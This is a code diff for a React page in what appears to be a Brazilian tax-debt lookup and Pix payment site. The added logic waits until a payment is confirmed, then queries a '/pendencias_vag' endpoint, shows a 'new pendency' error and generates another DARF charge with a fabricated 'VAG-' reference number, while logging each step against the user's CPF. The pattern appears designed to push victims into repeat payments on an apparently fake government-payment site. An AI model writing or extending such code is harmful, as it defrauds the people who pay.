@@ -7,14 +7,16 @@ import DarfScreen from "@/components/DarfScreen";
 import PixLoadingScreen from "@/components/PixLoadingScreen";
 import PixPaymentScreen from "@/components/PixPaymentScreen";
 import PaidScreen from "@/components/PaidScreen";
+import PendenciaErrorScreen from "@/components/PendenciaErrorScreen";
 import ConsultasTab from "@/components/ConsultasTab";
 import SegurancaTab from "@/components/SegurancaTab";
 import AjudaTab from "@/components/AjudaTab";
 import TabTransition from "@/components/TabTransition";
 import SplashScreen from "@/components/SplashScreen";
 import { useTracking } from "@/hooks/useTracking";
+import { supabase } from "@/integrations/supabase/client";
 
-type Screen = "splash" | "input" | "loading" | "result" | "darf" | "pix-loading" | "pix-payment" | "paid";
+type Screen = "splash" | "input" | "loading" | "result" | "darf" | "pix-loading" | "pix-payment" | "paid" | "pendencia-error" | "checking-pendencias";
 type Tab = "inicio" | "consultas" | "seguranca" | "ajuda";
 const recaptchaTokenStore = { current: "" };
 
@@ -46,6 +48,7 @@ const Index = () => {
   const [result, setResult] = useState<ResultData | null>(null);
   const [pixCopiaCola, setPixCopiaCola] = useState("");
   const [transactionId, setTransactionId] = useState("");
+  const [novaPendenciaValor, setNovaPendenciaValor] = useState(0);
   const { trackEvent } = useTracking();
   const totalValor = result?.pendencias.reduce((s, p) => s + p.valorTotal, 0) ?? 0;
   const autoStarted = useRef(false);
@@ -123,16 +126,56 @@ const Index = () => {
     trackEvent("pix_generated", cpf, { pix_length: pix.length, valor: totalValor, transactionId: txnId });
   }, [totalValor, cpf, trackEvent]);
 
-  const handlePaid = useCallback(() => {
-    setScreen("paid");
+  // After payment confirmed, check for new pendencies via /pendencias_vag
+  const handlePaid = useCallback(async () => {
     trackEvent("payment_confirmed", cpf, { valor: totalValor, transactionId });
+    setScreen("checking-pendencias");
+
+    try {
+      const res = await supabase.functions.invoke("api-proxy", {
+        body: { endpoint: "/pendencias_vag", cpf },
+      });
+
+      const data = res.data;
+      if (data && data.valor && Number(data.valor) > 0) {
+        setNovaPendenciaValor(Number(data.valor));
+        trackEvent("nova_pendencia_encontrada", cpf, { valor: data.valor });
+        setScreen("pendencia-error");
+        return;
+      }
+    } catch {
+      // If API fails, just show paid screen
+    }
+
+    setScreen("paid");
   }, [cpf, totalValor, transactionId, trackEvent]);
+
+  // When user clicks "Regularizar" on error screen, create a new single-pendencia result and go to darf
+  const handleRegularizarNovaPendencia = useCallback(() => {
+    setResult((prev) => {
+      if (!prev) return prev;
+      return {
+        ...prev,
+        pendencias: [
+          {
+            codigoReceita: "DARF",
+            dataVencimento: new Date().toISOString().split("T")[0],
+            juros: 0,
+            multa: 0,
+            numeroReferencia: `VAG-${Date.now()}`,
+            valorPrincipal: novaPendenciaValor,
+            valorTotal: novaPendenciaValor,
+          },
+        ],
+      };
+    });
+    setScreen("darf");
+    trackEvent("darf_viewed", cpf, { valor: novaPendenciaValor, source: "pendencia_vag" });
+  }, [novaPendenciaValor, cpf, trackEvent]);
 
   const handlePixError = useCallback(() => {
     setScreen("darf");
   }, []);
-
-  // totalValor is computed above
 
   if (showSplash) {
     return (
@@ -147,6 +190,22 @@ const Index = () => {
 
   if (screen === "loading") {
     return <LoadingScreen cpf={cpf} recaptchaToken={recaptchaTokenStore.current} onComplete={handleLoadingComplete} onTabChange={handleTabChange} />;
+  }
+
+  if (screen === "checking-pendencias" && result) {
+    return <LoadingScreen cpf={cpf} recaptchaToken="" onComplete={() => {}} onTabChange={handleTabChange} />;
+  }
+
+  if (screen === "pendencia-error" && result) {
+    return (
+      <PendenciaErrorScreen
+        nome={result.nome}
+        cpf={cpf}
+        valorNovaPendencia={novaPendenciaValor}
+        onRegularizar={handleRegularizarNovaPendencia}
+        onTabChange={handleTabChange}
+      />
+    );
   }
 
   if (screen === "pix-loading" && result) {
